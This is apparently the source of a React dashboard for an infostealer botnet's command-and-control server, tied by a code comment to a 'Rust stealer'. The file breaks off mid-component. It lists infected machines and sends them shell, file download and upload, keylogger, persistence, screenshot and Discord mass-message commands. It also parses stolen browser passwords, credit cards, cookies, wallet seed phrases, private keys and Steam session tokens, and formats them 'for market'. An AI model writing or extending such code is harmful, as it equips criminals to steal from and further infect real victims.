import React, { useState, useEffect, useMemo } from 'react';
import { motion } from 'framer-motion';
import { useAdminAuth } from '../contexts/AdminAuthContext';
import C2Debug from './C2Debug';
import { ComposableMap, Geographies, Geography, Marker } from "react-simple-maps";
import { AreaChart, Area, BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell } from 'recharts';

// World map data
const geoUrl = "https://raw.githubusercontent.com/zcreativelabs/react-simple-maps/master/topojson-maps/world-110m.json";

// Matches the LogPayload from the Rust stealer
interface Log {
  id: number; // Assuming the backend will add an ID
  agent_id: string;
  hostname: string;
  username: string;
  log_type: string;
  data: any; // This will be parsed based on log_type
  created_at: string;
  status: 'active' | 'inactive' | 'compromised';
  country_code?: string; // For map
}

interface Agent {
  id: number;
  agent_id: string;
  hostname: string;
  username: string;
  os_info: string;
  ip_address: string;
  last_seen: string;
  status: 'active' | 'inactive' | 'compromised';
  created_at: string;
  country_code?: string; // For map
}

interface Command {
  id: number;
  agent_id: string;
  command_type: 'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process' | 'discord_mass_dm';
  command_data: string;
  status: 'pending' | 'executing' | 'completed' | 'failed';
  result: string;
  created_at: string;
  executed_at: string;
  completed_at: string;
}

const C2Dashboard: React.FC = () => {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [logs, setLogs] = useState<Log[]>([]);
  const [logStatsByDay, setLogStatsByDay] = useState<any[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string>('');
  const [commandType, setCommandType] = useState<'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process' | 'discord_mass_dm'>('shell');
  const [commandData, setCommandData] = useState('');
  const [commandData2, setCommandData2] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'overview' | 'agents' | 'commands' | 'logs' | 'debug'>('overview');
  const [selectedLog, setSelectedLog] = useState<Log | null>(null);
  const [showInactive, setShowInactive] = useState(false);
  const { isAdminAuthenticated } = useAdminAuth();
  const [commandReplies, setCommandReplies] = useState<any[]>([]);

  useEffect(() => {
    if (isAdminAuthenticated) {
      fetchData();
      const interval = setInterval(fetchData, 5000); // Refresh every 5 seconds
      return () => clearInterval(interval);
    }
  }, [isAdminAuthenticated]);

  useEffect(() => {
    if (!selectedAgent) return;
    const fetchReplies = async () => {
      try {
        const headers = getAuthHeaders();
        const res = await fetch(`/api/admin/c2/command-replies/${encodeURIComponent(selectedAgent)}`, { headers });
        if (res.ok) {
          const data = await res.json();
          setCommandReplies(data.replies || []);
        } else {
          setCommandReplies([]);
        }
      } catch {
        setCommandReplies([]);
      }
    };
    fetchReplies();
  }, [selectedAgent, activeTab]);

  const getAuthHeaders = (): HeadersInit => {
    const token = localStorage.getItem('admin_token');
    const headers = new Headers();
    if (token) {
      headers.append('Authorization', `Bearer ${token}`);
    }
    return headers;
  };

  const getAuthHeadersWithContentType = (): HeadersInit => {
    const headers = getAuthHeaders();
    (headers as Headers).append('Content-Type', 'application/json');
    return headers;
  };

  const fetchData = async () => {
    if (!isAdminAuthenticated) return;

    try {
      const headers = getAuthHeaders();
      const [agentsRes, logsRes, statsRes] = await Promise.all([
        fetch('/api/admin/c2/agents', { headers }),
        fetch('/api/admin/c2/logs', { headers }), // Fetch logs instead of results
        fetch('/api/admin/c2/stats/logs-by-day', { headers })
      ]);
      
      if (agentsRes.ok) {
        const agentsData = await agentsRes.json();
        setAgents(agentsData);
      } else {
        console.error('Agents endpoint failed:', agentsRes.status, agentsRes.statusText);
      }
      
      if (logsRes.ok) {
        const logsData = await logsRes.json();
        setLogs(logsData.logs || []);
      } else {
        console.error('Logs endpoint failed:', logsRes.status, logsRes.statusText);
      }

      if (statsRes.ok) {
        const statsData = await statsRes.json();
        const formattedStats = statsData.map((stat: any) => ({
            date: new Date(stat.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric' }),
            important: stat.important || 0,
            regular: stat.regular || 0,
        }));
        setLogStatsByDay(formattedStats);
      } else {
        console.error('Log stats endpoint failed:', statsRes.status, statsRes.statusText);
      }
      
    } catch (error) {
      console.error('Error fetching C2 data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const sendCommand = async () => {
    if (!selectedAgent) {
      alert('Please select an agent');
      return;
    }

    let finalCommandData = commandData;

    if (commandType === 'download' || commandType === 'upload') {
      if (!commandData.trim()) {
        alert('Source path/URL is required.');
        return;
      }
      finalCommandData = JSON.stringify({
        source: commandData,
        destination: commandData2,
      });
    } else {
      if (commandType === 'discord_mass_dm') {
        if (!commandData.trim()) {
          alert('Command data is required.');
          return;
        }
      } else {
        if (!commandData.trim()) {
          alert('Command data is required.');
          return;
        }
      }
    }

    try {
      const response = await fetch('/api/admin/c2/command', {
        method: 'POST',
        headers: getAuthHeadersWithContentType(),
        body: JSON.stringify({
          agent_id: selectedAgent,
          command_type: commandType,
          command_data: finalCommandData
        })
      });

      if (response.ok) {
        setCommandData('');
        setCommandData2('');
        alert('Command sent successfully');
        fetchData();
        await fetchReplies();
      } else {
        alert('Failed to send command');
      }
    } catch (error) {
      console.error('Error sending command:', error);
      alert('Error sending command');
    }
  };

  const downloadFile = async (agentId: string, filename: string) => {
    try {
      console.log('Attempting to download:', { agentId, filename });
      const response = await fetch(`/api/admin/c2/download/${encodeURIComponent(agentId)}/${encodeURIComponent(filename)}`, {
        headers: getAuthHeaders()
      });

      console.log('Download response:', {
        status: response.status,
        statusText: response.statusText,
        headers: Object.fromEntries(response.headers.entries())
      });

      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
      } else {
        let errorMessage = `Failed to download file: Server returned status ${response.status}`;
        try {
          const errorData = await response.json();
          errorMessage = `Failed to download file: ${errorData.error || response.statusText}`;
          console.error('Download error details:', errorData);
        } catch (parseError) {
          console.error('Could not parse error response:', parseError);
        }
        alert(errorMessage);
      }
    } catch (error) {
      console.error('Error downloading file:', error);
      alert('Error downloading file: ' + (error instanceof Error ? error.message : 'Unknown error'));
    }
  };

  const killAgent = async (agentId: string, killType: 'agent' | 'process') => {
    if (!confirm(`Are you sure you want to kill this ${killType}? This action cannot be undone.`)) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/kill/${encodeURIComponent(agentId)}`, {
        method: 'POST',
        headers: getAuthHeadersWithContentType(),
        body: JSON.stringify({ killType })
      });

      if (response.ok) {
        const result = await response.json();
        alert(`Kill command sent successfully: ${result.message}`);
        fetchData(); // Refresh data
      } else {
        try {
          const errorData = await response.json();
          alert(`Failed to send kill command: ${errorData.error || response.statusText}`);
        } catch {
          alert(`Failed to send kill command: Server returned status ${response.status}`);
        }
      }
    } catch (error) {
      console.error('Error killing agent:', error);
      alert('Error killing agent');
    }
  };

  const deleteAgent = async (agentId: string) => {
    if (!confirm(`Are you sure you want to permanently delete this agent? This action cannot be undone and will remove all associated data.`)) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/agents/${encodeURIComponent(agentId)}`, {
        method: 'DELETE',
        headers: getAuthHeaders()
      });

      if (response.ok) {
        const result = await response.json();
        alert(`Agent deleted successfully: ${result.message}`);
        fetchData(); // Refresh data
      } else {
        try {
          const errorData = await response.json();
          alert(`Failed to delete agent: ${errorData.error || response.statusText}`);
        } catch {
          alert(`Failed to delete agent: Server returned status ${response.status}`);
        }
      }
    } catch (error) {
      console.error('Error deleting agent:', error);
      alert('Error deleting agent');
    }
  };

  const deleteLog = async (logId: number) => {
    if (!confirm('Are you sure you want to delete this log? This action cannot be undone.')) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/logs/${logId}`, {
        method: 'DELETE',
        headers: getAuthHeaders()
      });

      if (response.ok) {
        setLogs(logs.filter(l => l.id !== logId));
        alert('Log deleted successfully');
      } else {
        const data = await response.json();
        alert(`Failed to delete log: ${data.error || 'Unknown error'}`);
      }
    } catch (error) {
      console.error('Error deleting log:', error);
      alert('Error deleting log');
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'active': return 'text-green-500';
      case 'inactive': return 'text-yellow-500';
      case 'compromised': return 'text-red-500';
      default: return 'text-gray-500';
    }
  };

  const getStatusDotColor = (status: string) => {
    switch (status) {
      case 'active': return 'bg-green-500';
      case 'inactive': return 'bg-yellow-500';
      case 'compromised': return 'bg-red-500';
      default: return 'bg-gray-500';
    }
  };

  const getCommandTypeColor = (type: string) => {
    switch (type) {
      case 'shell': return 'bg-blue-500';
      case 'download': return 'bg-green-500';
      case 'upload': return 'bg-purple-500';
      case 'screenshot': return 'bg-yellow-500';
      case 'keylog': return 'bg-red-500';
      case 'persistence': return 'bg-indigo-500';
      case 'collect_data': return 'bg-teal-500';
      case 'collect_files': return 'bg-orange-500';
      case 'kill_process': return 'bg-red-600';
      case 'kill_agent': return 'bg-red-800';
      case 'discord_mass_dm': return 'bg-purple-500';
      default: return 'bg-gray-500';
    }
  };

  const getLogTypeColor = (type: string) => {
    switch (type) {
      case 'system_info': return 'bg-blue-500';
      case 'browsers': return 'bg-yellow-500';
      case 'wallets': return 'bg-green-500';
      case 'steam': return 'bg-gray-600';
      case 'processes': return 'bg-purple-500';
      case 'network': return 'bg-teal-500';
      default: return 'bg-gray-500';
    }
  };

  const filteredAgents = showInactive ? agents : agents.filter(a => a.status === 'active');

  const renderCommandInputs = () => {
    switch (commandType) {
      case 'shell':
        return (
          <div className="mb-6">
            <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Shell Command</label>
            <textarea
              value={commandData}
              onChange={(e) => setCommandData(e.target.value)}
              placeholder="e.g., whoami"
              className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none font-mono"
            />
          </div>
        );
      case 'download':
        return (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <div>
              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Source URL</label>
              <input
                type="text"
                value={commandData}
                onChange={(e) => setCommandData(e.target.value)}
                placeholder="http://example.com/file.exe"
                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Destination Path (on Agent, optional)</label>
              <input
                type="text"
                value={commandData2}
                onChange={(e) => setCommandData2(e.target.value)}
                placeholder="C:\Windows\Temp\downloaded_file.exe"
                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
              />
            </div>
          </div>
        );
      case 'upload':
        return (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <div>
              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Source Path (on Agent)</label>
              <input
                type="text"
                value={commandData}
                onChange={(e) => setCommandData(e.target.value)}
                placeholder="C:\Users\Target\Documents\secret.txt"
                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Destination Filename (on C2, optional)</label>
              <input
                type="text"
                value={commandData2}
                onChange={(e) => setCommandData2(e.target.value)}
                placeholder="uploaded_secret.txt"
                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
              />
            </div>
          </div>
        );
      case 'discord_mass_dm':
        return (
          <div className="mb-6">
            <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Message to Send</label>
            <textarea
              value={commandData}
              onChange={(e) => setCommandData(e.target.value)}
              placeholder="Enter the message to mass DM to all friends, DMs, and servers..."
              className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
            />
          </div>
        );
      case 'screenshot':
      case 'collect_data':
      case 'kill_agent':
        return (
            <div className="mb-6 p-4 bg-csfloat-darker border border-csfloat-gray/20 rounded-lg">
                <p className="text-csfloat-light/70">No additional parameters required for this command.</p>
            </div>
        );
      case 'kill_process':
        return (
          <div className="mb-6">
            <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Process Name or PID</label>
            <input
              type="text"
              value={commandData}
              onChange={(e) => setCommandData(e.target.value)}
              placeholder="e.g., notepad.exe or 1234"
              className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
            />
          </div>
        );
      case 'collect_files':
          return (
            <div className="mb-6">
              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Path / Glob Pattern</label>
              <input
                type="text"
                value={commandData}
                onChange={(e) => setCommandData(e.target.value)}
                placeholder="C:\Users\Target\Documents\*.docx"
                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
              />
            </div>
          );
      case 'persistence':
          return (
            <div className="mb-6">
              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">File to make persistent (optional)</label>
              <input
                type="text"
                value={commandData}
                onChange={(e) => setCommandData(e.target.value)}
                placeholder="Leave blank to make the agent itself persistent"
                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
              />
            </div>
          );
      default:
        return (
          <div className="mb-6">
            <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Command Data</label>
            <textarea
              value={commandData}
              onChange={(e) => setCommandData(e.target.value)}
              placeholder="Enter command data..."
              className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
            />
          </div>
        );
    }
  };

  const renderCommandReplies = () => (
    <div className="bg-gray-800/70 rounded-lg p-6 border border-gray-700/50 mt-8">
      <h3 className="text-lg font-bold mb-4 text-csfloat-blue">Command Replies</h3>
      {commandReplies.length === 0 ? (
        <div className="text-csfloat-light/70">No command replies yet.</div>
      ) : (
        <div className="overflow-x-auto">
          <table className="min-w-full text-sm">
            <thead>
              <tr className="text-csfloat-light/70">
                <th className="px-2 py-1 text-left">Time</th>
                <th className="px-2 py-1 text-left">Command</th>
                <th className="px-2 py-1 text-left">Result</th>
              </tr>
            </thead>
            <tbody>
              {commandReplies.map((reply, idx) => (
                <tr key={idx} className="border-b border-csfloat-gray/10">
                  <td className="px-2 py-1 font-mono">{new Date(reply.created_at || reply.time).toLocaleString()}</td>
                  <td className="px-2 py-1 font-mono">{reply.command_type}</td>
                  <td className="px-2 py-1 font-mono whitespace-pre-wrap max-w-xs break-all">{reply.result_data || reply.result}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );

  // Don't render if not authenticated
  if (!isAdminAuthenticated) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-csfloat-darker to-black pt-16 pb-12 text-white">
      <div className="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-white mb-2">C2 Command Center</h1>
          <p className="text-csfloat-light/70">An overview of agent activity and collected intelligence.</p>
        </div>

        {/* Tabs */}
        <div className="flex space-x-1 mb-6">
          {[
            { id: 'overview', label: 'Overview' },
            { id: 'agents', label: 'Agents' },
            { id: 'commands', label: 'Commands' },
            { id: 'logs', label: 'Logs' },
            { id: 'debug', label: 'Debug' }
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`px-6 py-3 rounded-lg font-medium transition-colors ${
                activeTab === tab.id
                  ? 'bg-csfloat-blue text-white'
                  : 'text-csfloat-light/70 hover:text-white hover:bg-csfloat-gray/20'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>
        
        {isLoading ? (
          <div className="text-center py-8">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-csfloat-blue mx-auto"></div>
            <p className="mt-4 text-csfloat-light/60">Loading C2 data...</p>
          </div>
        ) : (
          <>
            {/* Overview Tab */}
            {activeTab === 'overview' && <OverviewTab agents={agents} logs={logs} logStatsByDay={logStatsByDay} />}

            {/* Agents Tab - simplified, as full details are in logs */}
            {activeTab === 'agents' && (
              <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
                <div className="p-6">
                  <div className="flex justify-between items-center mb-4">
                    <h2 className="text-2xl font-bold">Agents ({filteredAgents.length})</h2>
                    <label className="flex items-center space-x-2 cursor-pointer">
                      <input 
                        type="checkbox" 
                        className="form-checkbox h-5 w-5 text-blue-600 bg-gray-800 border-gray-600 rounded focus:ring-blue-500"
                        checked={showInactive}
                        onChange={() => setShowInactive(!showInactive)}
                      />
                      <span className="text-gray-300">Show Inactive</span>
                    </label>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                    {filteredAgents.map(agent => (
                      <div 
                        key={agent.agent_id} 
                        className={`bg-gray-800 rounded-lg p-4 cursor-pointer transition-all duration-200 ${selectedAgent === agent.agent_id ? 'ring-2 ring-blue-500' : 'hover:bg-gray-700'}`}
                        onClick={() => setSelectedAgent(agent.agent_id)}
                      >
                        <div className="flex justify-between items-start">
                          <div className="flex-grow">
                            <div className="flex items-center mb-2">
                              <div className={`w-3 h-3 rounded-full mr-2 ${getStatusDotColor(agent.status)}`}></div>
                              <p className="font-bold text-lg truncate" title={agent.hostname}>{agent.hostname}</p>
                            </div>
                            <p className="text-sm text-gray-400 truncate" title={agent.agent_id}>{agent.agent_id}</p>
                          </div>
                          <div className="flex-shrink-0">
                             <span className={`px-2 py-1 text-xs font-semibold rounded-full ${getStatusColor(agent.status)} bg-opacity-20`}>
                              {agent.status}
                            </span>
                          </div>
                        </div>
                        <div className="mt-4 space-y-2 text-sm">
                          <div className="flex justify-between">
                            <span className="text-gray-400">Username:</span>
                            <span className="font-mono">{agent.username}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">IP Address:</span>
                            <span className="font-mono">{agent.ip_address}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">OS:</span>
                            <span className="text-right truncate" title={agent.os_info}>{agent.os_info}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Last Seen:</span>
                            <span>{new Date(agent.last_seen).toLocaleString()}</span>
                          </div>
                        </div>
                        {/* Kill Agent Buttons */}
                        <div className="mt-4 pt-3 border-t border-gray-700">
                          <div className="flex space-x-2 mb-2">
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                killAgent(agent.agent_id, 'process');
                              }}
                              className="flex-1 bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
                              title="Kill the agent process (agent will restart if persistence is enabled)"
                            >
                              Kill Process
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                killAgent(agent.agent_id, 'agent');
                              }}
                              className="flex-1 bg-red-800 hover:bg-red-900 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
                              title="Terminate the agent completely (marks as compromised)"
                            >
                              Kill Agent
                            </button>
                          </div>
                          <div className="flex">
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                deleteAgent(agent.agent_id);
                              }}
                              className="w-full bg-gray-800 hover:bg-gray-700 text-red-400 hover:text-red-300 px-3 py-1 rounded text-xs font-medium transition-colors border border-gray-600 hover:border-gray-500"
                              title="Permanently delete this agent and all associated data"
                            >
                              🗑️ Delete Agent
                            </button>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Commands Tab - simplified */}
            {activeTab === 'commands' && (
              <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
                <div className="p-6">
                  <h2 className="text-2xl font-bold text-white mb-4">Send Command</h2>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                    <div>
                      <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                        Select Agent
                      </label>
                      <select
                        value={selectedAgent}
                        onChange={(e) => setSelectedAgent(e.target.value)}
                        className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                      >
                        <option value="">Choose an agent...</option>
                        {agents.map((agent) => (
                          <option key={agent.id} value={agent.agent_id}>
                            {agent.hostname} ({agent.agent_id})
                          </option>
                        ))}
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                        Command Type
                      </label>
                      <select
                        value={commandType}
                        onChange={(e) => {
                          setCommandType(e.target.value as any);
                          setCommandData('');
                          setCommandData2('');
                        }}
                        className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                      >
                        <option value="shell">Shell Command</option>
                        <option value="download">Download File</option>
                        <option value="upload">Upload File</option>
                        <option value="screenshot">Screenshot</option>
                        <option value="keylog">Start Keylogger</option>
                        <option value="discord_mass_dm">Discord Mass DM</option>
                        <option value="persistence">Add Persistence</option>
                        <option value="collect_data">Collect System Info</option>
                        <option value="collect_files">Collect Files by Pattern</option>
                        <option value="kill_process">Kill Process</option>
                        <option value="kill_agent">Kill Agent</option>
                      </select>
                    </div>
                  </div>
                  {renderCommandInputs()}
                  <button
                    onClick={sendCommand}
                    disabled={!selectedAgent || (commandType !== 'screenshot' && commandType !== 'collect_data' && commandType !== 'kill_agent' && !commandData.trim())}
                    className="bg-csfloat-blue hover:bg-blue-600 disabled:bg-csfloat-gray/50 text-white px-6 py-2 rounded-lg transition-colors duration-200 disabled:cursor-not-allowed"
                  >
                    Send Command
                  </button>
                  {renderCommandReplies()}
                </div>
              </div>
            )}

            {/* Logs Tab */}
            {activeTab === 'logs' && <LogsTab logs={logs} onSelectLog={setSelectedLog} onDeleteLog={deleteLog} getLogTypeColor={getLogTypeColor} />}

            {/* Debug Tab */}
            {activeTab === 'debug' && <C2Debug />}
          </>
        )}

        {/* Log Viewer Modal */}
        {selectedLog && (
          <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 backdrop-blur-sm">
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1.0 }}
              className="bg-csfloat-dark rounded-lg p-6 max-w-4xl w-full mx-4 max-h-[90vh] overflow-y-auto border border-csfloat-gray/20"
            >
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-xl font-bold text-white">Log Details</h3>
                <button
                  onClick={() => setSelectedLog(null)}
                  className="text-csfloat-light/60 hover:text-white"
                >
                  ✕
                </button>
              </div>
              <LogViewer log={selectedLog} />
            </motion.div>
          </div>
        )}
      </div>
    </div>
  );
};

// --- Helper Functions & Components for Overview Tab ---

const isImportantLog = (log: Log) => {
    const { log_type, data } = log;
    if (!data) return false;

    switch (log_type) {
        case 'wallets':
            return Object.values(data).some((wallet_array: any) => 
                Array.isArray(wallet_array) && wallet_array.some(w => w.seed_phrase || (w.private_keys && w.private_keys.length > 0))
            );
        case 'browsers':
            return Object.values(data.chromium || {}).some((browser: any) => 
                (browser.logins && browser.logins.length > 0) || (browser.credit_cards && browser.credit_cards.length > 0)
            ) || Object.values(data.gecko || {}).some((browser: any) => 
                (browser.logins && browser.logins.length > 0) || (browser.credit_cards && browser.credit_cards.length > 0)
            );
        case 'steam':
            return data.ssfn_files?.length > 0 || data.vdf_files?.length > 0;
        case 'gaming':
            return data.battlenet?.session_files?.length > 0 || data.epic_games?.session_files?.length > 0 || data.uplay?.session_files?.length > 0;
        default:
            return false;
    }
};

const hasValuableData = (log: Log): boolean => {
    const { log_type, data } = log;
    if (!data) return false;

    switch (log_type) {
        case 'wallets':
             return Object.values(data).some((wallet_array: any) => 
                Array.isArray(wallet_array) && wallet_array.some(w => w.seed_phrase || (w.private_keys && w.private_keys.length > 0) || w.balance)
            );
        case 'browsers':
            return Object.values(data.chromium || {}).some((browser: any) => 
                (browser.logins && browser.logins.length > 0) || 
                (browser.credit_cards && browser.credit_cards.length > 0) ||
                (browser.cookies && browser.cookies.length > 0)
            ) || Object.values(data.gecko || {}).some((browser: any) => 
                (browser.logins && browser.logins.length > 0) || 
                (browser.credit_cards && browser.credit_cards.length > 0) ||
                (browser.cookies && browser.cookies.length > 0)
            );
        case 'steam':
            return data.ssfn_files?.length > 0 || data.vdf_files?.length > 0 || data.installed_games?.length > 0;
        case 'gaming':
            return data.battlenet?.session_files?.length > 0 || data.epic_games?.session_files?.length > 0 || data.uplay?.session_files?.length > 0;
        case 'processes':
        case 'network':
        case 'system_info':
            return data && Object.keys(data).length > 0;
        default:
            return false;
    }
};

const formatLogForMarket = (log: Log): string => {
    let output = `##################################################\n`;
    output += `#                 AGENT DETAILS                  #\n`;
    output += `##################################################\n`;
    output += `Hostname:      ${log.hostname || 'N/A'}\n`;
    output += `Username:      ${log.username || 'N/A'}\n`;
    output += `Log Timestamp: ${new Date(log.created_at).toUTCString()}\n\n`;

    output += `##################################################\n`;
    output += `#         LOG TYPE: ${log.log_type.toUpperCase()}         #\n`;
    output += `##################################################\n\n`;
    
    const { data } = log;

    switch (log.log_type) {
        case 'wallets':
            Object.entries(data).forEach(([walletName, walletArray]: [string, any]) => {
                const valuableWallets = walletArray.filter((w: any) => w.seed_phrase || (w.private_keys && w.private_keys.length > 0) || w.balance);
                if (valuableWallets.length > 0) {
                    output += `---------- ${walletName.toUpperCase()} ----------\n`;
                    valuableWallets.forEach((wallet: any, index: number) => {
                        output += `  [Wallet #${index + 1}]\n`;
                        output += `  Path:          ${wallet.path}\n`;
                        if (wallet.balance) output += `  Balance:       ${wallet.balance}\n`;
                        if (wallet.seed_phrase) output += `  Seed Phrase:   ${wallet.seed_phrase}\n`;
                        if (wallet.private_keys && wallet.private_keys.length > 0) {
                            output += `  Private Keys:\n${wallet.private_keys.map((pk: string) => `    - ${pk}`).join('\n')}\n`;
                        }
                        output += '\n';
                    });
                }
            });
            break;

        case 'browsers':
            const formatBrowser = (browserData: any, browserName: string) => {
                let browserOutput = '';
                const { logins, credit_cards, cookies } = browserData;
                if ((logins?.length || 0) > 0 || (credit_cards?.length || 0) > 0) {
                     browserOutput += `---------- ${browserName.toUpperCase()} ----------\n`;
                     if (logins?.length > 0) {
                         browserOutput += `\n--- Passwords (${logins.length}) ---\n`;
                         logins.forEach((l: any) => {
                             browserOutput += `URL: ${l.url} | User: ${l.username} | Pass: ${l.password}\n`;
                         });
                     }
                     if (credit_cards?.length > 0) {
                         browserOutput += `\n--- Credit Cards (${credit_cards.length}) ---\n`;
                         credit_cards.forEach((cc: any) => {
                             browserOutput += `Name: ${cc.name_on_card} | Num: ${cc.card_number} | Exp: ${cc.expiration_month}/${cc.expiration_year}\n`;
                         });
                     }
                      if (cookies?.length > 0) {
                         browserOutput += `\n--- Cookies (${cookies.length}) ---\n`;
                         browserOutput += `(Cookie data is extensive and best viewed in the raw JSON format)\n`
                     }
                     browserOutput += '\n';
                }
                return browserOutput;
            }
            Object.entries(data.chromium || {}).forEach(([name, browser]) => output += formatBrowser(browser, `Chromium: ${name}`));
            Object.entries(data.gecko || {}).forEach(([name, browser]) => output += formatBrowser(browser, `Gecko: ${name}`));
            break;
            
        case 'steam':
             output += `--- Steam Account ---\n`;
             if (data.account_name) output += `Account Name: ${data.account_name}\n`;
             if (data.level) output += `Level:        ${data.level}\n`;
             if (data.balance) output += `Balance:      ${data.balance}\n\n`;
             if (data.ssfn_files?.length > 0) {
                 output += `SSFN Files (session tokens):\n${data.ssfn_files.map((f: string) => `  - ${f}`).join('\n')}\n\n`;
             }
             if (data.vdf_files?.length > 0) {
                 output += `VDF Files (config/login info):\n${data.vdf_files.map((f: string) => `  - ${f}`).join('\n')}\n\n`;
             }
             if (data.installed_games?.length > 0) {
                 output += `Installed Games:\n${data.installed_games.join(', ')}\n`;
             }
            break;

        default:
            output += JSON.stringify(data, null, 2);
            break;
    }

    return output;
};

const OverviewStatCard: React.FC<{ title: string, value: string, subValue?: string, color: string, icon: React.ReactNode }> = ({ title, value, subValue, color, icon }) => (
    <div className={`rounded-lg p-4 text-white flex items-center ${color}`}>
        <div className="text-4xl mr-4">{icon}</div>
        <div>
            <div className="text-sm uppercase font-bold tracking-wider">{title}</div>
            <div className="text-2xl font-bold">{value}</div>
            {subValue && <div className="text-xs opacity-80">{subValue}</div>}
        </div>
    </div>
);

const OverviewTab: React.FC<{agents: Agent[], logs: Log[], logStatsByDay: any[]}> = ({ agents, logs, logStatsByDay }) => {
    
    const totalLogs = logs.length;
    const importantLogs = logs.filter(isImportantLog).length;

    const totalLogsData = useMemo(() => [
        { name: 'Important Logs', value: importantLogs, color: '#3b82f6' },
        { name: 'Regular Logs', value: totalLogs - importantLogs, color: '#4b5563' }
    ], [logs]);

    const onlineAgents = agents.filter(a => a.status === 'active').length;

    return (
        <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                <OverviewStatCard 
                    title="Online Agents" 
                    value={onlineAgents.toString()} 
                    subValue={`/ ${agents.length} total`}
                    color="text-green-400"
